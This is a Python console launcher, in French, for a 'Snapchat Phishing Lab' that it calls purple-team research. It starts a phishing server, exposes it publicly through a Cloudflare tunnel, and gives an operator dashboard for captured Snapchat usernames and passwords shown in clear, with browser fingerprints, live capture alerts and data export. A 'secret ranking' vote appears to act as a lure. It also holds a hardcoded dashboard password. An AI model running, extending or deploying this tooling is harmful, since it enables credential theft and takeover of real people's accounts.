"""
╔══════════════════════════════════════════════════════════════╗
║  Snapchat Phishing Lab — Purple Team Launcher               ║
║  Usage: python launcher.py                                   ║
╚══════════════════════════════════════════════════════════════╝
"""
import os, sys, json, sqlite3, time, threading, socket, webbrowser, subprocess, re, shutil, urllib.request, ssl
from datetime import datetime
from io import StringIO
import csv

BASE = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE, "captured_credentials.db")
CF_PATH = os.path.join(BASE, "cloudflared.exe")
ADMIN_KEY_FILE = os.path.join(BASE, ".admin_key")
ACCESS_PW = os.environ.get("SNAPCHAT_LAB_DASHBOARD_PW", "76247010aidafamoussa")

sys.path.insert(0, BASE)

# ── Colors ──
try:
    from colorama import init, Fore, Style
    init()
    R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN;
    M = Fore.MAGENTA; B = Fore.BLUE; W = Fore.WHITE; X = Style.RESET_ALL; D = Style.DIM
except ImportError:
    class _F:
        def __getattr__(self, n): return ''
    Fore = _F(); Style = _F()
    R=G=Y=C=M=B=W=X=D=''

# ── Logo ──
LOGO = f"""\
{Y}   ███████╗███╗   ███╗     ███████╗███╗   ██╗ ██████╗{X}
{Y}   ██╔════╝████╗ ████║     ██╔════╝████╗  ██║██╔════╝{X}
{Y}   █████╗  ██╔████╔██║     ███████╗██╔██╗ ██║██║  ███╗{X}
{Y}   ██╔══╝  ██║╚██╔╝██║     ╚════██║██║╚██╗██║██║   ██║{X}
{Y}   ██║     ██║ ╚═╝ ██║     ███████║██║ ╚████║╚██████╔╝{X}
{Y}   ╚═╝     ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝{X}"""

# ── Globals ──
flask_thread = None
cf_thread = None
cf_url = None
cf_proc = None
WATCH_ACTIVE = False

# ══════════════════════════════════════════════════════════════
#  DB HELPERS
# ══════════════════════════════════════════════════════════════

def db():
    return sqlite3.connect(DB_PATH, timeout=10)

def db_stats():
    try:
        conn = db()
        caps = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        with_pw = conn.execute("SELECT COUNT(*) FROM captured_credentials WHERE password != '' AND password IS NOT NULL").fetchone()[0]
        sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
        voters = conn.execute("SELECT COUNT(DISTINCT participant_id) FROM votes_top3 WHERE snap_validated=1").fetchone()[0]
        conn.close()
        return caps, with_pw, sessions, voters
    except:
        return 0, 0, 0, 0

def admin_key():
    try:
        if os.path.exists(ADMIN_KEY_FILE):
            with open(ADMIN_KEY_FILE) as f:
                return f.read().strip()
    except:
        pass
    return None

# ══════════════════════════════════════════════════════════════
#  UI
# ══════════════════════════════════════════════════════════════

def cls():
    os.system("cls" if os.name == "nt" else "clear")

def title_bar():
    """Top status bar showing key info."""
    k = admin_key()
    caps, wpw, sess, voters = db_stats()
    running = is_server_running()
    tunnel = cf_url or "—"

    status = f"{G}● UP{X}" if running else f"{R}● DOWN{X}"
    caps_str = f"{W}{caps}{X}" if caps > 0 else f"{D}0{X}"
    pw_str = f"{G}{wpw}{X}" if wpw > 0 else f"{D}0{X}"

    bar = f"  {C}SERVER{X} {status}  "
    if running:
        bar += f"| {C}Captures{X} {caps_str}  | {G}PW{X} {pw_str}  | {C}Sessions{X} {sess}  | {M}Votants{X} {voters}"
    if tunnel and tunnel != "—":
        bar += f"  |  {Y}Tunnel{X} {tunnel[:45]}"
    print(f"  {D}{'─' * 78}{X}")
    print(bar)
    print(f"  {D}{'─' * 78}{X}")

def show_logo():
    cls()
    print()
    print(LOGO)
    print()
    print(f"  {D}{'─' * 60}{X}")
    print(f"  {C}  Snapchat Phishing Lab{X}  -  {M}Purple Team Research{X}")
    print(f"  {D}{'─' * 60}{X}")
    print()

def show_menu():
    print(f"  {C}╔══════════════════════════════════════════════╗{X}")
    print(f"  {C}║              MENU PRINCIPAL                 ║{X}")
    print(f"  {C}╚══════════════════════════════════════════════╝{X}")
    print()
    print(f"    {M}[1]{X}  Démarrer le serveur")
    print(f"    {M}[2]{X}  Démarrer avec tunnel Cloudflare")
    print()
    print(f"    {C}[3]{X}  Dashboard interactif")
    print(f"    {C}[4]{X}  Surveillance en direct (Watch Live)")
    print()
    print(f"    {Y}[5]{X}  Exporter les données")
    print(f"    {Y}[6]{X}  Ouvrir dans le navigateur")
    print(f"    {Y}[7]{X}  Vérifier la base de données")
    print()
    print(f"    {R}[8]{X}  Réinitialiser toutes les données")
    print()
    print(f"    {D}[0]{X}  Quitter")
    print()
    return input(f"  {G}└─>{X} ").strip()

# ══════════════════════════════════════════════════════════════
#  SERVER
# ══════════════════════════════════════════════════════════════

def is_server_running():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(1)
        from main import CONFIG as _cfg
        port = _cfg.get("SERVER_PORT", 8080)
        s.connect(("127.0.0.1", port))
        return True
    except:
        return False
    finally:
        s.close()

def server_url():
    try:
        from main import CONFIG as _cfg
        proto = "https" if _cfg.get("USE_HTTPS") else "http"
        port = _cfg.get("SERVER_PORT", 8080)
    except:
        proto = "http"
        port = 8080
    return f"{proto}://localhost:{port}"

def start_flask():
    os.environ["PYTHONIOENCODING"] = "utf-8"
    import logging
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    from main import app, init_database, CONFIG
    init_database()
    ssl_ctx = 'adhoc' if CONFIG.get("USE_HTTPS") else None
    port = CONFIG.get("SERVER_PORT", 8080)
    app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False, ssl_context=ssl_ctx)

def start_server():
    global flask_thread
    if is_server_running():
        return True
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    for _ in range(20):
        if is_server_running():
            return True
        time.sleep(0.3)
    return False

def stop_server():
    try:
        import requests
        requests.post(f"{server_url()}/shutdown", timeout=2)
    except:
        pass

# ══════════════════════════════════════════════════════════════
#  CLOUDFLARE TUNNEL
# ══════════════════════════════════════════════════════════════

def download_cloudflared():
    if os.path.exists(CF_PATH):
        return True
    print(f"  {Y}Téléchargement de cloudflared...{X}")
    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    try:
        urllib.request.urlretrieve(url, CF_PATH)
        print(f"  {G}✓ Téléchargé{X}")
        return True
    except Exception as e:
        print(f"  {R}✗ Échec : {e}{X}")
        return False

def start_tunnel():
    global cf_url, cf_proc, cf_thread
    cf_url = None
    if not os.path.exists(CF_PATH):
        if not download_cloudflared():
            return None
    cf_thread = threading.Thread(target=_run_tunnel, daemon=True)
    cf_thread.start()
    for _ in range(45):
        if cf_url:
            return cf_url
        time.sleep(0.4)
    return None

def _run_tunnel():
    global cf_url, cf_proc
    try:
        from main import CONFIG as _cfg
        port = _cfg.get("SERVER_PORT", 8080)
        proto = "https" if _cfg.get("USE_HTTPS") else "http"
        proc = subprocess.Popen(
            [CF_PATH, "tunnel", "--url", f"{proto}://127.0.0.1:{port}"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        cf_proc = proc
        if not proc.stdout:
            return
        for line in iter(proc.stdout.readline, b''):
            text = line.decode("utf-8", errors="replace").strip()
            m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', text)
            if m:
                cf_url = m.group(0)
    except:
        pass

def stop_tunnel():
    global cf_proc, cf_url
    if cf_proc:
        try:
            cf_proc.terminate()
            cf_proc.wait(timeout=5)
        except:
            try: cf_proc.kill()
            except: pass
        cf_proc = None
    cf_url = None

# ══════════════════════════════════════════════════════════════
#  ACTIONS
# ══════════════════════════════════════════════════════════════

def action_1_start():
    stop_tunnel()
    show_logo()
    print(f"  {C}Démarrage du serveur...{X}")
    if start_server():
        print(f"\n  {G}✓ Serveur actif : {server_url()}{X}")
    else:
        print(f"\n  {R}✗ Échec du démarrage{X}")
    input(f"\n  {D}[Appuie sur Entrée]{X}")

def action_2_tunnel():
    show_logo()
    if not os.path.exists(CF_PATH):
        print(f"  {Y}Cloudflared non trouvé. Téléchargement...{X}")
        if not download_cloudflared():
            input(f"\n  {D}[Appuie sur Entrée]{X}")
            return
    stop_tunnel()
    if not start_server():
        print(f"  {R}✗ Le serveur n'a pas démarré{X}")
        input(f"  {D}[Appuie sur Entrée]{X}")
        return
    print(f"  {Y}Démarrage du tunnel Cloudflare...{X}")
    url = start_tunnel()
    if url:
        print(f"\n  {G}✓ Tunnel actif : {url}{X}")
    else:
        print(f"\n  {R}✗ Le tunnel n'a pas pu être créé{X}")
    input(f"\n  {D}[Appuie sur Entrée]{X}")

def action_3_dashboard():
    show_logo()
    if not is_server_running():
        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
        print(f"  {Y}  → Utilise [1] ou [2] pour démarrer{X}")
        input(f"\n  {D}[Appuie sur Entrée]{X}")
        return
    p = input(f"  {Y}Mot de passe dashboard >{X} ")
    if p != ACCESS_PW:
        print(f"  {R}Accès refusé{X}")
        time.sleep(1)
        input(f"\n  {D}[Appuie sur Entrée]{X}")
        return
    terminal_dashboard()

def action_4_watch():
    show_logo()
    if not is_server_running():
        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
        print(f"  {Y}  → Utilise [1] ou [2] pour démarrer{X}")
        input(f"\n  {D}[Appuie sur Entrée]{X}")
        return
    watch_live()

def action_5_export():
    show_logo()
    if not is_server_running():
        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
        input(f"\n  {D}[Appuie sur Entrée]{X}")
        return
    export_menu()

def action_6_browser():
    show_logo()
    if not is_server_running():
        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
        input(f"\n  {D}[Appuie sur Entrée]{X}")
        return
    target = cf_url if cf_url else server_url()
    webbrowser.open(target)
    print(f"\n  {G}✓ Ouverture : {target}{X}")
    input(f"\n  {D}[Appuie sur Entrée]{X}")

def action_7_dbcheck():
    show_logo()
    if not is_server_running():
        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
        input(f"\n  {D}[Appuie sur Entrée]{X}")
        return
    ctx = ssl._create_unverified_context()
    try:
        r = urllib.request.urlopen(f"{server_url()}/api/dbcheck", context=ctx, timeout=5)
        d = json.loads(r.read())
        print(f"  {C}Base de données :{X}")
        print(f"    {C}Chemin :{X}       {d.get('db_path','?')}")
        print(f"    {C}Existante :{X}     {'Oui' if d.get('db_exists') else 'Non'}")
        print(f"    {G}Captures :{X}      {d.get('total_captures',0)}")
        print(f"    {C}Logs :{X}          {d.get('total_logs',0)}")
        caps, wpw, sessions, voters = db_stats()
        print(f"    {G}Avec mot de passe :{X} {wpw}")
        print(f"    {C}Sessions :{X}       {sessions}")
        print(f"    {M}Votants validés :{X} {voters}")
        bp = os.path.join(BASE, "backups")
        if os.path.exists(bp):
            bks = [f for f in os.listdir(bp) if f.endswith('.db')]
            print(f"    {D}Sauvegardes :{X}    {len(bks)} fichier(s)")
    except Exception as e:
        print(f"  {R}✗ Erreur : {e}{X}")
    print()
    input(f"  {D}[Appuie sur Entrée]{X}")

def action_8_reset():
    show_logo()
    print(f"  {R}⚠️  SUPPRESSION TOTALE DES DONNÉES ⚠️{X}")
    print(f"  {Y}  Cette action supprime toutes les captures et tous les logs.{X}")
    print()
    confirm = input(f"  {R}  Taper 'SUPPRIMER' pour confirmer >{X} ").strip().upper()
    if confirm != "SUPPRIMER":
        print(f"  {Y}✗ Annulé{X}")
        input(f"\n  {D}[Appuie sur Entrée]{X}")
        return
    # Backup
    try:
        backup_dir = os.path.join(BASE, "backups")
        os.makedirs(backup_dir, exist_ok=True)
        if os.path.exists(DB_PATH):
            bname = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
            shutil.copy2(DB_PATH, os.path.join(backup_dir, bname))
            print(f"  {D}  ✓ Sauvegarde : {bname}{X}")
    except Exception as e:
        print(f"  {R}  ✗ Sauvegarde échouée : {e}{X}")
    # Reset
    conn = db()
    conn.execute("DELETE FROM captured_credentials")
    conn.execute("DELETE FROM experiment_log")
    conn.execute("DELETE FROM votes_top3")
    conn.commit()
    conn.close()
    print(f"  {G}  ✓ Toutes les données ont été supprimées{X}")
    print(f"  {D}  Les votes du Classement Secret ont aussi été réinitialisés{X}")
    print()
    input(f"  {D}[Appuie sur Entrée]{X}")

# ══════════════════════════════════════════════════════════════
#  WATCH LIVE
# ══════════════════════════════════════════════════════════════

def watch_live():
    global WATCH_ACTIVE
    last_id, last_vote_id = 0, 0
    try:
        conn = db()
        last_id = conn.execute("SELECT COALESCE(MAX(id),0) FROM captured_credentials").fetchone()[0]
        last_vote_id = conn.execute("SELECT COALESCE(MAX(id),0) FROM votes_top3").fetchone()[0]
        conn.close()
    except:
        pass

    show_logo()
    print(f"  {G}[WATCH LIVE]{X} Surveillance en temps réel")
    print(f"  {D}  Nouveaux credentials capturés et votes s'affichent ici.{X}")
    print(f"  {D}  Commence au #ID {last_id}. Ctrl+C pour arrêter.{X}")
    print()
    WATCH_ACTIVE = True

    try:
        while WATCH_ACTIVE:
            time.sleep(1.5)
            conn = db()
            # Credentials
            rows = conn.execute(
                "SELECT id, step, username, password, timestamp FROM captured_credentials WHERE id > ? ORDER BY id",
                (last_id,)
            ).fetchall()
            # New votes
            votes = conn.execute(
                "SELECT id, pseudo, snap_validated, created_at FROM votes_top3 WHERE id > ? ORDER BY id",
                (last_vote_id,)
            ).fetchall()
            conn.close()

            for r in rows:
                user = r[2] or "-"
                pw = r[3] if r[3] else "-"
                step = r[1] or "?"
                ts = r[4][11:19] if r[4] else "--:--:--"
                label = f"{G}CAPTURE{X}" if pw and pw != "-" else f"{Y}LOGIN{X}"
                print(f"  {D}{ts}{X} {label} #{r[0]} [{step:<8}] {user} / {pw}")
                if pw and pw != "-":
                    print("  \a", end='', flush=True)
                last_id = r[0]

            for v in votes:
                ts = v[3][11:19] if v[3] else "--:--:--"
                val = f"{G}VALIDÉ{X}" if v[2] else f"{Y}EN ATTENTE{X}"
                print(f"  {D}{ts}{X} {M}VOTE{X}   #{v[0]} {v[1]} → {val}")
                last_vote_id = v[0]

    except KeyboardInterrupt:
        pass
    WATCH_ACTIVE = False
    print(f"\n  {Y}Surveillance arrêtée.{X}")
    input(f"\n  {D}[Appuie sur Entrée]{X}")

# ══════════════════════════════════════════════════════════════
#  EXPORT
# ══════════════════════════════════════════════════════════════

def export_menu():
    show_logo()
    print(f"  {C}Exporter les données{X}")
    print()
    print(f"    {W}[1]{X} JSON")
    print(f"    {W}[2]{X} CSV")
    print(f"    {W}[3]{X} Rapport HTML")
    print(f"    {D}[0]{X} Retour")
    print()
    c = input(f"  {G}└─>{X} ").strip()
    k = admin_key()
    if not k:
        print(f"  {R}✗ Clé admin introuvable{X}")
        input(f"\n  {D}[Appuie sur Entrée]{X}")
        return
    ctx = ssl._create_unverified_context()
    base_url = server_url()
    now = datetime.now().strftime('%Y%m%d_%H%M%S')

    if c == "1":
        try:
            r = urllib.request.urlopen(f"{base_url}/export?key={k}", context=ctx, timeout=10)
            data = r.read().decode()
            path = os.path.join(BASE, f"export_{now}.json")
            with open(path, "w", encoding="utf-8") as f:
                f.write(data)
            print(f"\n  {G}✓ Exporté : {path}{X} ({len(data)} octets)")
        except Exception as e:
            print(f"\n  {R}✗ Erreur : {e}{X}")
    elif c == "2":
        try:
            r = urllib.request.urlopen(f"{base_url}/export/csv?key={k}", context=ctx, timeout=10)
            data = r.read().decode('utf-8-sig')
            path = os.path.join(BASE, f"export_{now}.csv")
            with open(path, "w", encoding="utf-8-sig") as f:
                f.write(data)
            print(f"\n  {G}✓ Exporté : {path}{X} ({len(data)} octets)")
        except Exception as e:
            print(f"\n  {R}✗ Erreur : {e}{X}")
    elif c == "3":
        try:
            r = urllib.request.urlopen(f"{base_url}/export/report?key={k}", context=ctx, timeout=10)
            data = r.read().decode()
            path = os.path.join(BASE, f"report_{now}.html")
            with open(path, "w", encoding="utf-8") as f:
                f.write(data)
            print(f"\n  {G}✓ Exporté : {path}{X} ({len(data)} octets)")
        except Exception as e:
            print(f"\n  {R}✗ Erreur : {e}{X}")
    elif c == "0":
        return
    print()
    input(f"  {D}[Appuie sur Entrée]{X}")

# ══════════════════════════════════════════════════════════════
#  TERMINAL DASHBOARD
# ══════════════════════════════════════════════════════════════

def terminal_dashboard():
    while True:
        cls()
        print(LOGO)
        title_bar()
        print()
        print(f"  {C}╔══════════════════════════════════════════════╗{X}")
        print(f"  {C}║            DASHBOARD INTERACTIF            ║{X}")
        print(f"  {C}╚══════════════════════════════════════════════╝{X}")
        print()
        print(f"    {C}STATISTIQUES{X}")
        print(f"    {W}[1]{X}  Vue d'ensemble")
        print(f"    {W}[2]{X}  Credentials (masqués)")
        print(f"    {W}[3]{X}  Credentials (mots de passe visibles)")
        print(f"    {W}[4]{X}  Logs d'activité")
        print(f"    {W}[5]{X}  Empreintes numériques (fingerprints)")
        print()
        print(f"    {M}CLASSEMENT SECRET{X}")
        print(f"    {W}[6]{X}  Voir les votes et le classement")
        print()
        print(f"    {Y}EXPORT / ACTIONS{X}")
        print(f"    {W}[7]{X}  Exporter")
        print(f"    {R}[8]{X}  Réinitialiser")
        print()
        print(f"    {D}[0]{X}  Retour au menu principal")
        print()
        c = input(f"  {G}└─>{X} ").strip()
        if c == "1": td_stats()
        elif c == "2": td_creds(False)
        elif c == "3": td_creds(True)
        elif c == "4": td_logs()
        elif c == "5": td_fingerprints()
        elif c == "6": td_votes()
        elif c == "7": export_menu()
        elif c == "8": action_8_reset()
        elif c == "0": break

def td_table(headers, rows):
    cols = len(headers)
    cw = [max(len(h), max((len(str(r[i])) for r in rows), default=0)) for i, h in enumerate(headers)]
    print("  " + " + ".join("=" * cw[i] for i in range(cols)))
    print("  " + " | ".join(h.ljust(cw[i]) for i, h in enumerate(headers)))
    print("  " + " + ".join("=" * cw[i] for i in range(cols)))
    for r in rows:
        print("  " + " | ".join(str(r[i]).ljust(cw[i]) for i in range(cols)))
    print("  " + " + ".join("=" * cw[i] for i in range(cols)))

def td_stats():
    cls(); print(LOGO); title_bar()
    conn = db()
    total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
    with_pw = conn.execute("SELECT COUNT(*) FROM captured_credentials WHERE password != '' AND password IS NOT NULL").fetchone()[0]
    sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
    unique = conn.execute("SELECT COUNT(DISTINCT participant_id) FROM captured_credentials").fetchone()[0]
    daily = conn.execute("SELECT DATE(timestamp), COUNT(*) FROM captured_credentials GROUP BY DATE(timestamp) ORDER BY DATE(timestamp) DESC LIMIT 7").fetchall()
    voters = conn.execute("SELECT COUNT(DISTINCT participant_id) FROM votes_top3 WHERE snap_validated=1").fetchone()[0]
    votes_count = conn.execute("SELECT COUNT(*) FROM votes_top3").fetchone()[0]
    conn.close()
    print(f"\n  {C}STATISTIQUES{X}\n")
    td_table(
        ["Sessions", "Captures", "PW capturés", "Uniques", "Conversion", "Votants"],
        [[sessions, total, with_pw, unique,
          f"{round(total/sessions*100,1) if sessions else 0}%",
          f"{M}{voters}{X}"]]
    )
    if daily:
        print(f"\n  {D}Derniers 7 jours :{X}")
        mx = max(d[1] for d in daily) if daily else 1
        for d, cnt in daily:
            bar = "#" * max(1, int(cnt / mx * 30))
            print(f"    {d}  {G}{bar}{X} ({cnt})")
    if votes_count > 0:
        print(f"\n  {M}Classement Secret : {votes_count} vote(s) dont {voters} validé(s){X}")
    print()
    input(f"  {D}[Appuie sur Entrée]{X}")

def td_creds(show_pw):
    cls(); print(LOGO); title_bar()
    conn = db()
    rows = conn.execute(
        "SELECT id, participant_id, username, password, timestamp, step FROM captured_credentials ORDER BY id DESC"
    ).fetchall()
    conn.close()
    if not rows:
        print(f"\n  {Y}Aucune donnée.{X}\n")
        input(f"  {D}[Appuie sur Entrée]{X}")
        return
    print(f"\n  {C}CREDENTIALS ({len(rows)} enregistrement(s)){X}\n")
    for r in rows:
        has = bool(r[3])
        pw = f"{G}{r[3]}{X}" if show_pw and has else (f"{G}***{X}" if has else f"{D}-{X}")
        step = r[5] or "?"
        color = G if has else D
        pid_short = str(r[1] or '-')[:22]
        user_display = str(r[2] or '-')[:22]
        print(f"  #{r[0]:<4} {color}[{step:<8}]{X} {pid_short:<22} {user_display:<22} {pw:<20} {r[4][:19]}")
    print()
    input(f"  {D}[Appuie sur Entrée]{X}")

def td_logs():
    cls(); print(LOGO); title_bar()
    conn = db()
    rows = conn.execute(
        "SELECT id, event_type, participant_id, details, timestamp FROM experiment_log ORDER BY id DESC LIMIT 40"
    ).fetchall()
    conn.close()
    if not rows:
        print(f"\n  {Y}Aucun log.{X}\n")
        input(f"  {D}[Appuie sur Entrée]{X}")
        return
    print(f"\n  {C}LOGS ({len(rows)} derniers){X}\n")
    for r in rows:
        ev = r[1][:20]
        pid = str(r[2] or '-')[:16]
        ts = r[4][11:19] if r[4] else "--:--:--"
        print(f"  {ts} {C}{ev:<20}{X} {pid:<18} #{r[0]}")
    print()
    input(f"  {D}[Appuie sur Entrée]{X}")

def td_fingerprints():
    cls(); print(LOGO); title_bar()
    conn = db()
    rows = conn.execute(
        "SELECT id, participant_id, screen_resolution, timezone, browser_language, "
        "platform, time_on_page, referrer, click_count, step "
        "FROM captured_credentials WHERE screen_resolution != '' ORDER BY id DESC"
    ).fetchall()
    conn.close()
    if not rows:
        print(f"\n  {Y}Aucune empreinte.{X}\n")
        input(f"  {D}[Appuie sur Entrée]{X}")
        return
    print(f"\n  {C}FINGERPRINTS ({len(rows)} enregistrement(s)){X}\n")
    for r in rows:
        pid = str(r[1])[:20]
        print(f"  #{r[0]} [{r[9]}] {C}{pid}{X}")
        print(f"    {D}Écran :{X} {r[2]}  |  {D}Fuseau :{X} {r[3]}")
        print(f"    {D}Langue :{X} {r[4]}  |  {D}Plateforme :{X} {r[5]}")
        print(f"    {D}Temps :{X} {r[6]}s  |  {D}Nombre de clics :{X} {r[8]}")
        if r[7]: print(f"    {D}Provenance :{X} {r[7]}")
        print()
    input(f"  {D}[Appuie sur Entrée]{X}")

def td_votes():
    cls(); print(LOGO); title_bar()
    conn = db()
    ctx = ssl._create_unverified_context()
    try:
        r = urllib.request.urlopen(f"{server_url()}/api/classement", context=ctx, timeout=5)
        data = json.loads(r.read())
    except Exception as e:
        print(f"\n  {R}Erreur de chargement : {e}{X}\n")
        input(f"  {D}[Appuie sur Entrée]{X}")
        return
    # Also list individual votes
    votes_rows = conn.execute(
        "SELECT id, pseudo, snap_validated, created_at FROM votes_top3 ORDER BY id DESC"
    ).fetchall()
    conn.close()

    ranking = data.get('ranking', [])
    total_voters = data.get('total_voters', 0)

    print(f"\n  {M}CLASSEMENT SECRET — {total_voters} votant(s) validé(s){X}\n")

    if not ranking:
        print(f"  {Y}Aucun vote encore.{X}")
    else:
        td_table(
            ["#", "Nom", "Score"],
            [[i+1, r['name'], f"{G}{r['score']} pts{X}"] for i, r in enumerate(ranking)]
        )

    print(f"\n  {D}Liste des votants :{X}")
    if not votes_rows:
        print(f"  {Y}  Aucun.{X}")
    else:
        for v in votes_rows:
            val = f"{G}✓ Validé{X}" if v[2] else f"{Y}⏳ En attente{X}"
            ts = v[3][:19] if v[3] else "--"
            print(f"  #{v[0]} {C}{v[1] or '?'}{X} — {val} ({ts})")
    print()
    input(f"  {D}[Appuie sur Entrée]{X}")

# ══════════════════════════════════════════════════════════════
#  MAIN LOOP
# ══════════════════════════════════════════════════════════════

def main():
    while True:
        show_logo()
        title_bar()
        c = show_menu()

        if c == "1":
            action_1_start()
        elif c == "2":
            action_2_tunnel()
        elif c == "3":
            action_3_dashboard()
        elif c == "4":
            action_4_watch()
        elif c == "5":
            action_5_export()
        elif c == "6":
            action_6_browser()
        elif c == "7":
            action_7_dbcheck()
        elif c == "8":
            action_8_reset()
        elif c == "0":
            stop_tunnel()
            stop_server()
            cls()
            print()
            print(LOGO)
            print()
            print(f"  {R}Au revoir boss !{X}")
            print()
            break

if __name__ == "__main__":
    main()
